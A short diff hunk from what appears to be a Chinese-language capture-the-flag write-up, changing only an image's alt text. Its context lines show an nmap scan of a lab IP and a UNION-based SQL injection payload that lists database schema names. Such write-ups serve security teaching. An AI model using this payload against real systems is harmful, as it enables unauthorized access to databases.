@@ -143,7 +143,7 @@ nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap
 -2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
 ```
 
-![image-20220407111855200](https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png)
+![](https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png)
 
 爆出所有表名和列名
 
